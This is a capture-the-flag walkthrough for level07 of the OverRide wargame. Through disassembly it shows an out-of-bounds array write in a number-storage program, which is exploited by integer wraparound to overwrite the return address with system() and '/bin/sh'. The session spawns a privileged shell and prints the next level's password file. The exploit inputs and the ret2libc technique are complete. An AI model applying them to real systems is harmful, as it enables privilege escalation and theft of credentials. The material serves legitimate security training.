# Level 07 Walkthrough

Via running the program we see it asks for some commands and executes them accordingly
```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: quit
```

Upon disassembling the program we see that our input is stored at `esp+0x1b8` which then compared to the available commands.
```
   0x0804884f <+300>:	mov    eax,0x8048d4b                                // 0x8048d4b:       "Input command: "
   0x08048854 <+305>:	mov    DWORD PTR [esp],eax
   0x08048857 <+308>:	call   0x8048470 <printf@plt>
   0x0804885c <+313>:	mov    DWORD PTR [esp+0x1b4],0x1
   0x08048867 <+324>:	mov    eax,ds:0x804a040                            // 0x804a040 <stdin@@GLIBC_2.0>:   0x00
   0x0804886c <+329>:	mov    DWORD PTR [esp+0x8],eax
   0x08048870 <+333>:	mov    DWORD PTR [esp+0x4],0x14
   0x08048878 <+341>:	lea    eax,[esp+0x1b8]
   0x0804887f <+348>:	mov    DWORD PTR [esp],eax
   0x08048882 <+351>:	call   0x80484a0 <fgets@plt>
...
   0x080488b7 <+404>:	lea    eax,[esp+0x1b8]                             // our input command
   0x080488be <+411>:	mov    edx,eax
   0x080488c0 <+413>:	mov    eax,0x8048d5b                               // "store" 
   0x080488c5 <+418>:	mov    ecx,0x5
   0x080488ca <+423>:	mov    esi,edx
   0x080488cc <+425>:	mov    edi,eax
   0x080488ce <+427>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080488d0 <+429>:	seta   dl
   0x080488d3 <+432>:	setb   al
   0x080488d6 <+435>:	mov    ecx,edx
   0x080488d8 <+437>:	sub    cl,al
   0x080488da <+439>:	mov    eax,ecx
   0x080488dc <+441>:	movsx  eax,al
   0x080488df <+444>:	test   eax,eax
   0x080488e1 <+446>:	jne    0x80488f8 <main+469>
   0x080488e3 <+448>:	lea    eax,[esp+0x24]
   0x080488e7 <+452>:	mov    DWORD PTR [esp],eax
   0x080488ea <+455>:	call   0x8048630 <store_number>
   0x080488ef <+460>:	mov    DWORD PTR [esp+0x1b4],eax
   0x080488f6 <+467>:	jmp    0x8048965 <main+578>
...
   0x080488f8 <+469>:	lea    eax,[esp+0x1b8]                             // our input command
   0x080488ff <+476>:	mov    edx,eax
   0x08048901 <+478>:	mov    eax,0x8048d61                               // "read"
   0x08048906 <+483>:	mov    ecx,0x4
   0x0804890b <+488>:	mov    esi,edx
   0x0804890d <+490>:	mov    edi,eax
   0x0804890f <+492>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048911 <+494>:	seta   dl
   0x08048914 <+497>:	setb   al
   0x08048917 <+500>:	mov    ecx,edx
   0x08048919 <+502>:	sub    cl,al
   0x0804891b <+504>:	mov    eax,ecx
   0x0804891d <+506>:	movsx  eax,al
   0x08048920 <+509>:	test   eax,eax
   0x08048922 <+511>:	jne    0x8048939 <main+534>
   0x08048924 <+513>:	lea    eax,[esp+0x24]
   0x08048928 <+517>:	mov    DWORD PTR [esp],eax
   0x0804892b <+520>:	call   0x80486d7 <read_number>
   0x08048930 <+525>:	mov    DWORD PTR [esp+0x1b4],eax
   0x08048937 <+532>:	jmp    0x8048965 <main+578>
...
```

Disassemling `store_number()` we see that we have a buffer overflow when array indexing
```
   0x08048644 <+20>:	mov    eax,0x8048ad3                // " Number: "
   0x08048649 <+25>:	mov    DWORD PTR [esp],eax
   0x0804864c <+28>:	call   0x8048470 <printf@plt>
   0x08048651 <+33>:	call   0x80485e7 <get_unum>
   0x08048656 <+38>:	mov    DWORD PTR [ebp-0x10],eax     // ebp-0x10 where our Number is stored
   0x08048659 <+41>:	mov    eax,0x8048add                // " Index: " 
   0x0804865e <+46>:	mov    DWORD PTR [esp],eax
   0x08048661 <+49>:	call   0x8048470 <printf@plt>
   0x08048666 <+54>:	call   0x80485e7 <get_unum>
   0x0804866b <+59>:	mov    DWORD PTR [ebp-0xc],eax      // ebp-0xc where our Index is stored
...
   0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080486c5 <+149>:	shl    eax,0x2                   // shifting `eax` by two bits effectively multiplying its value by 4.
   0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]   // adding the result to our buffer's address effectively accessing adjacent memory 
   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080486ce <+158>:	mov    DWORD PTR [eax],edx       // store Number in buffer+index*4
   0x080486d0 <+160>:	mov    eax,0x0
```

We'll use this to overwrite the main's return address with the `system` address.
```
overflow  : 1073741824
EIP is at : 1073741824 + 114 = 1073741938
system    : 0xf7e6aed0 = 4159090384₁₀
"/bin/sh" :
            offfset = 15d7ec
            0xf7e2c000 + 0x15d7ec = 0xf7f897ec
                                    4160264172₁₀

level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```